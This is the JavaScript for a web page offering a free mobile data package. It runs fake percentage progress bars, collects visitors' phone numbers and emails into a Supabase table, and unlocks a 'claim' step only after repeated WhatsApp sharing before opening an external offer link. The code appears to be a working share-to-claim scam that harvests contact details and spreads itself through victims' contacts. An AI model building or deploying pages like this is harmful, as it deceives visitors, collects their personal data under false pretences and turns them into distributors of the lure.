(()=>{
  'use strict';
  const C=window.ANN_CONFIG;
  const S=window.ANN_SHARING;
  const $=id=>document.getElementById(id);
  const show=id=>{['intro','loader','info','checking','share','claim'].forEach(x=>{const el=$(x);if(el)el.style.display=x===id?'block':'none'})};

  async function saveRegistration(phone,email){
    const cfg=C.supabase;
    if(!cfg?.url||!cfg?.key||!cfg?.table)return;
    try{
      const response=await fetch(`${cfg.url}/rest/v1/${encodeURIComponent(cfg.table)}`,{
        method:'POST',
        headers:{
          'Content-Type':'application/json',
          'apikey':cfg.key,
          'Authorization':`Bearer ${cfg.key}`,
          'Prefer':'return=minimal'
        },
        body:JSON.stringify({
          phone,
          email,
          package:$('year')?.value||'25GB'
        })
      });
      if(!response.ok)throw new Error(`Supabase insert failed: ${response.status}`);
    }catch(error){
      console.error('Registration save failed',error);
    }
  }

  $('go').addEventListener('click',()=>{
    show('loader');
    let p=0;
    const timer=setInterval(()=>{
      p=Math.min(100,p+5);
      $('num').textContent=`${p}%`;
      if(p>=100){clearInterval(timer);setTimeout(()=>show('info'),250)}
    },Math.max(60,Math.floor(C.processingMs/20)));
  });

  $('name').addEventListener('input',e=>{e.target.value=e.target.value.replace(/\D/g,'').slice(0,11)});

  $('confirm').addEventListener('click',()=>{
    const phone=$('name').value.trim();
    const email=$('email').value.trim();
    const phoneOk=/^\d{10,11}$/.test(phone);
    const emailOk=/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

    $('phoneError').style.display=phoneOk?'none':'block';
    $('emailError').style.display=emailOk?'none':'block';
    if(!phoneOk||!emailOk)return;

    saveRegistration(phone,email);
    $('getname').textContent=phone;
    show('checking');
    let p=0;
    const timer=setInterval(()=>{
      p=Math.min(100,p+5);
      $('fill').style.width=`${p}%`;
      $('percentage').textContent=`${p}%`;
      if(p>=100){clearInterval(timer);setTimeout(()=>{show('share');syncShare()},250)}
    },Math.max(50,Math.floor(C.activationMs/20)));
  });

  function syncShare(){
    const p=Math.min(100,S.width||0);
    $('fill2').style.width=`${p}%`;
    $('percentage2').textContent=`${p}%`;
    if(p>=100)show('claim');
  }

  $('whatsapp').addEventListener('click',()=>{
    S.open();
    setTimeout(syncShare,300);
  });

  window.addEventListener('pageshow',syncShare);
  window.addEventListener('focus',syncShare);

  document.querySelectorAll('[data-final]').forEach(btn=>btn.addEventListener('click',()=>{
    if(C.finalUrl)window.open(C.finalUrl,'_blank');
  }));
  $('offer').addEventListener('click',()=>{if(C.finalUrl)window.open(C.finalUrl,'_blank')});

  window.ANN_COMMENTS?.init();
  syncShare();
})();
